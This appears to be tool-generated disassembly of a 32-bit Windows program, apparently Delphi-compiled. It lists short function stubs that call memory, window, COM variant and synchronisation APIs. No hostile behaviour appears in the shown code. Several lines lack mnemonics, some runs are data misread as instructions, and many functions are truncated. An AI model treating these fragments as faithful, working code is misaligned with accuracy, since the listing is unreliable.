jmp [ WindowFromPoint@IAT ]
sub_4067f8
call GetTickCount
retn
sub_406800
xor eax eax
retn
sub_406804
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406814
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406830
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406844
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_40687c
call sub_4067ec
retn
sub_406884
call sub_4067ec
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_406a68
pop ebp
retn
sub_406a6c
sub [ rw-data ] 0x1
retn
sub_406aa0
pop ebp
retn
sub_406aa4
sub [ rw-data ] 0x1
retn
sub_406db0
pop ebp
retn
sub_406db4
sub [ rw-data ] 0x1
retn
sub_407881
add eax 0xffffffd4
jmp sub_40cb90
sub_407889
add eax 0xffffffd4
jmp sub_40ca38
sub_407891
add eax 0xffffffd4
jmp sub_40cad4
sub_4078a3
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40567c
sub_4078ad
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405690
sub_407bdc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407ba4
test eax eax
sete al
pop esi
pop ebx
retn
sub_4080f4
call sub_4080d0
retn
sub_40818c
push eax
call CloseHandle
retn
sub_40835c
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408370
push esi
mov esi eax
xchg edx eax
call sub_4028b8
mov eax esi
pop esi
retn
sub_408530
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_404164
pop esi
pop ebx
retn
sub_408544
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026bc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408558
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408590
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026dc
sub_4085f8
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402818
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_40861c
push ebx
mov ebx eax
mov eax ebx
call sub_403f6c
pop ebx
retn
sub_40897f
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403f6c
pop eax
pop ebx
retn
sub_408c37
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_408d92
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4090ef
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4090ef
sub_4091ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40442c
mov edx esi
xor ecx ecx
call sub_409038
pop esi
pop ebx
retn
sub_409220
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40442c
mov edx esi
mov cl 0x1
call sub_409038
pop esi
pop ebx
retn
sub_4098a1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409999
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a144
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a1cc
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a170
pop ebp
retn 0x8
sub_40a318
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40a7c2
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40acae
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ad60
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40ae0a
pop esi
pop ecx
pop ebp
retn
sub_40afed
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b010
jns r-xdata
test esp edx
jns r-xdata
cld
add [ eax ] al
add [ eax ] al
sub_40b044
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b42c
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_4031e8
sub_40b528
pop ebx
retn
sub_40b5cf
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b5d8
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4039a8
sub_40b5e5
retn
sub_40b5e8
push ebp
mov ebp esp
call sub_40b52c
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b5d8
pop ebp
retn 0x4
sub_40b604
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
retn
sub_40b69c
push ebx
mov ebx eax
mov eax ebx
call sub_40b61c
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40b876
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b942
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40b94c
call sub_40b1d8
mov eax 0x1
call sub_403f54
sub_40bad0
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40bbcd
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40bc78
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40bbdc
mov ecx eax
sub_40be64
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40be84
push eax
call CharNextA
retn
sub_40c127
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c190
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40c5ee
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ Sleep@IAT ]
sub_40c733
pop ebx
mov esp ebp
pop ebp
retn
sub_40c738
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40c69c
sub_40c748
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40c764
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026dc
pop ebx
retn
sub_40c7ec
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40c7f8
xchg [ eax ] edx
mov eax edx
retn
sub_40c858
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40c8e8
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40ca00
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40ca28
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40ccaa
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40cd1f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cd3d
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40cd3d
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d207
pop ebp
retn
VariantInit
jmp [ VariantInit@IAT ]
VariantChangeType
jmp [ __import_lookup_table_11(oleaut32:VariantChangeType) ]
sub_40d280
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d2ed
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d359
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d3c5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d431
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d49d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d51c
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40d58f
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d5ff
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d673
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40da00
pop ebp
retn
sub_40da04
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40d6c8
sub_40da15
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e03d
pop ecx
pop ebp
retn
sub_40e0d6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e12d
pop ecx
pop ebp
retn
sub_40e1c6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e21d
pop ecx
pop ebp
retn
sub_40e46c
pop ebx
mov esp ebp
pop ebp
retn
sub_40e505
pop ecx
pop ebp
retn
sub_40e508
push ebx
mov ebx eax
mov eax ebx
call sub_40e7a0
mov [ ebx ] 0x1
pop ebx
retn
sub_40e7a0
test [ eax ] 0xbfe8
jne r-xdata
call sub_40e724
retn
mov [ eax ] 0x0
retn
sub_40e7b4
push eax
call sub_40e7a0
pop eax
retn
sub_40ea14
call sub_40eac8
retn
sub_40ec39
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ece4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed06
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404664
retn
sub_40ed06
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ed69
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f332
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f3cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f3e9
lea eax [ ebp - 0x14 ]
call sub_40464c
retn
sub_40f3e9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f44d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f513
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fa75
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fb20
push eax
call sub_40e7a0
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_40fb34
push eax
call sub_40e7a0
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_40fbac
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40eac8
add esp 0x10
sub_40fe5d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fea0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40e7a0
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_40feb8
mov edx 0x80020004
call sub_40fea0
retn
sub_40ff50
pop esi
pop ebx
pop ebp
retn
sub_40ff54
push ebp
mov ebp esp
call sub_410114
pop ebp
retn 0x4
sub_40ffe0
push ebp
mov ebp esp
call sub_410114
pop ebp
retn 0x4
sub_4100ca
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403224
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403590
sub_4100ec
xor eax eax
retn
sub_4100f0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_410104
mov [ ecx ] 0x8
mov al 0x1
retn
sub_41010c
call sub_40dfec
retn
sub_410114
call sub_40e0dc
retn
sub_41011c
call sub_40e4b4
retn
sub_410124
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_410138
call sub_410114
retn
sub_410140
push ebp
mov ebp esp
call sub_41011c
pop ebp
retn 0x8
sub_410158
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_410304
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410321
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
sub_410321
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41032c
call sub_40e508
retn
sub_4103aa
pop ebp
retn
sub_410454
pop ebp
retn
sub_41056c
pop ebp
retn
sub_410570
sub [ rw-data ] 0x1
retn
sub_4105a4
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_410828
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403fc0
pop esi
pop ebx
retn
sub_4108cb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4109cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410bcc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40eac8
pop esi
pop ebx
retn
sub_410d55
pop ebp
retn
sub_410d58
sub [ rw-data ] 0x1
retn
sub_410d8c
pop ebp
retn
sub_410d90
sub [ rw-data ] 0x1
retn
sub_411693
add [ esp + 0x4 ] 0xfffffff8
jmp sub_413fd8
sub_41169d
add [ esp + 0x4 ] 0xfffffff8
jmp sub_413ff8
sub_411cd9
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
sub_411df0
0x411d
sub_41207b
add [ esp + 0x4 ] 0xffffffd8
jmp sub_4199c4
sub_412085
add [ esp + 0x4 ] 0xffffffd8
jmp sub_4199e4
sub_41208f
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_4121b7
push ecx
push eax
jmp esp
sub_4123fc
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_412520
mov eax [ eax + 0xc ]
call sub_4136e4
retn
sub_4127fe
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412804
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41389c
test eax eax
setge al
pop esi
pop ebx
retn
sub_412b0e
mov esp ebp
pop ebp
retn
sub_412bdc
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_412be8
push ebx
mov ebx edx
mov edx ebx
call sub_4129fc
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_41275c
sub_412c94
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_412ed4
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_412f47
pop ebx
mov esp ebp
pop ebp
retn
sub_412f99
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_41302c
pop ebx
pop ebp
retn
sub_413079
pop ebx
pop ebp
retn
sub_4130c5
pop ebx
pop ebp
retn
sub_413116
pop esi
pop ebx
pop ebp
retn
sub_413171
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413374
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_413984
sub_4135f5
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413696
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4136b5
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4136b5
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_413718
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4139e0
xor edx edx
mov eax ebx
call sub_4139a4
pop ebx
retn
sub_413790
mov eax [ ebp + 0x4 ]
retn
sub_4137c6
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41381b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413820
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_413838
xor edx edx
call sub_413840
retn
sub_413928
mov edx [ eax + 0x8 ]
dec edx
call sub_413840
retn
sub_413a50
retn
sub_413b11
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403590
sub_413ba7
pop ebx
pop ecx
pop ebp
retn
sub_413bac
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_413c0a
pop ebx
pop ecx
pop ebp
retn
sub_413c10
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_413c4c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
retn
sub_413c64
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_413d3f
retn
sub_413de4
test edx edx
je r-xdata
xor edx edx
call sub_413df8
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_413eb5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413ec8
xchg edx eax
call sub_413df8
retn
sub_413ed0
retn
sub_413f70
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413fc6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
sub_4141d1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4141ee
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_4141ee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414290
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41434c
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_4143fc
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414408
mov eax [ ebp + 0x4 ]
retn
sub_41443e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_414493
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414559
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41457b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
sub_41457b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414584
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_41458c
xor eax eax
retn
sub_4145dc
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4146f6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41478b
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414862
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41491f
pop esi
pop ecx
pop ebp
retn
sub_4149ab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4149c8
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
sub_4149c8
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414a78
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414ab4
retn
sub_414b3e
mov eax [ ebp - 0x8 ]
call sub_417678
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b63
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_414b63
mov esp ebp
pop ebp
retn
sub_414bba
pop esi
pop ecx
pop ebp
retn
sub_414c14
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414c1c
retn
sub_414c9e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414d42
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d5f
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
sub_414d5f
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414d64
retn
sub_414de5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414dec
mov eax edx
mov edx ecx
call sub_407ba4
retn
sub_414df8
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_414e10
sub_414e88
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_414ef8
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_414f14
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_415108
mov eax [ eax + 0x18 ]
retn
sub_41510c
mov eax [ eax + 0x14 ]
retn
sub_4151a8
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_4153b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_4026fc
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_4153f0
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_415408
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41541c
mov edx sub_415408
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_415464
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407ba4
retn
mov eax edx
mov edx ecx
call sub_407b6c
retn
sub_415500
retn
sub_4157ff
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_415867
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4158ac
mov eax [ eax + 0x4 ]
call sub_4080fc
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_4158bc
mov eax [ eax + 0x4 ]
call sub_408128
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_4158f8
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_415b00
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_415b90
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_415be0
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_415dd2
mov esp ebp
pop ebp
retn
sub_415e7c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
retn
sub_415f04
mov [ eax + 0x18 ] edx
retn
sub_416080
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_410744
retn
sub_41610e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4161c1
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4163dd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4163fc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4163fc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416534
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
pop ebx
retn
sub_41654c
mov eax [ rw-data ]
call sub_416534
retn
sub_416584
push ebx
call sub_4105fc
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41654c
sub_4166f8
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403f6c
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41681f
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41693a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416a38
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_415480
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_416afc
push ebx
mov ebx eax
mov eax ebx
call sub_4184b0
cmp al 0x9
sete al
pop ebx
retn
sub_416b62
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_416c0f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416e8e
jmp sub_4036bc
sub_416eba
jmp sub_4036bc
sub_416f5c
jmp sub_4036bc
sub_416fff
jmp sub_4036bc
sub_4171d7
jmp sub_4036bc
sub_417250
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41739d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417670
mov dl 0x1
call sub_4165d8
retn
sub_4177a8
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
j_sub_4177a8
jmp sub_4177a8
sub_4177b8
pop ebx
mov esp ebp
pop ebp
retn
sub_4177c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4185c0
mov eax [ rw-data ]
call sub_416534
pop ebp
retn
j_sub_4037e8#2
jmp sub_4037e8
j_sub_4037e8
jmp sub_4037e8
sub_417966
add [ eax ] eax
add [ eax ] al
int3
sub_4179b3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417a9a
mov esp ebp
pop ebp
retn
sub_417b59
pop ecx
pop ecx
pop ebp
retn
sub_417e62
pop ebx
mov esp ebp
pop ebp
retn
sub_41810e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403234
retn
sub_41814b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4036bc
sub_418182
jmp sub_4036bc
sub_4181c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4181ea
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403f90
retn
sub_4181ea
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418271
jmp sub_4036bc
sub_4182a5
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4182b0
push ecx
mov edx esp
mov ecx 0x4
call sub_416a74
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_416534
sub_4183c4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4184aa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418507
pop ebx
pop ecx
pop ebp
retn
sub_418756
pop ecx
pop ecx
pop ebp
retn
sub_4187a0
pop ebx
pop ecx
pop ebp
retn
sub_418843
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4188f8
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418904
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_418b66
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b8b
